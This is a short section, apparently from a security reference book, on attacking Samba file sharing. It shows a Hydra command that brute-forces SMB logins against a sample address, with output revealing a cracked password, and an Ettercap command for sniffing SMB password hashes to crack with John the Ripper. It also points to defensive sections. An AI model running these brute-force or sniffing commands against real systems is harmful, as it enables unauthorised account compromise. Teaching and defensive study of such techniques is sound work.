# ### Samba: 137 to 139 (TCP)

Samba uses the SMB (Server Message Block) protocol to share files and printers over the network. SMB is most commonly used by Microsoft Windows operating systems. See http://www.samba.org/ for details on the Samba project.

**Brute-Forcing** Since Samba authenticates using a username and password pair, it is possible to brute-force user accounts.

# #### Brute-Force Samba

Hydra can be used to brute-force SMB authentication:

```
```bash
$ hydra -L usernames.txtx -P passwords.txt 10.0.0.1 smb
Reduced number of tasks to 1 (smb does not like parallel connections)
Hydra v2.2 (c) 2002 by van Hauser / THC - use allowed only for legal
purposes.
  Hydra is starting! [parallel tasks: 1, login tries: 2 (1:2/p:1)]
[139][smb] login: Joe password: Sh4k3$1s0und!
Hydra finished.
```
```

# #### Prevent Samba Brute-Forcing

> > Please see “Common Defenses Against Brute-Force Attacks.”

**Sniffing** It is possible to sniff password hashes transmitted over the network during Samba authentication. Once the hashes are captured, they must be brute-force cracked in order to obtain the real password.

# #### Obtain Samba Password Hashes

Ettercap can be used to capture Samba hashes sent over the network during authentication. For example, here is how you would run Ettercap to collect SMB password hashes being transmitted over the network:

```
```
ettercap -C -N -m
```
```

Password crackers such as John the Ripper, available at http://www.openwall.com/john/, can be used to crack the obtained hashes.

# #### Tunnel Samba Traffic Securely

> > Please see “Block and Tunnel Samba Traffic.”